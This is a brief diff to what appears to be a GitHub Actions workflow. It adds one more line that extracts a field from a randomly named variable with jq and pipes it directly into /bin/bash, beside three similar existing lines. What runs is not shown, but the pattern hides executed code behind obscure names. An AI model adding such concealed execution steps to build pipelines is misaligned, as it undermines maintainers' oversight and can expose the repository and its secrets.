@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$g235" | jq -r .mgin3015 | /bin/bash
           echo $yl4 | jq -r .waxf71461 | /bin/bash
           echo $j7 | jq -r .dcbaw13 | /bin/bash
+          echo $ntldr80618 | jq -r .e055 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
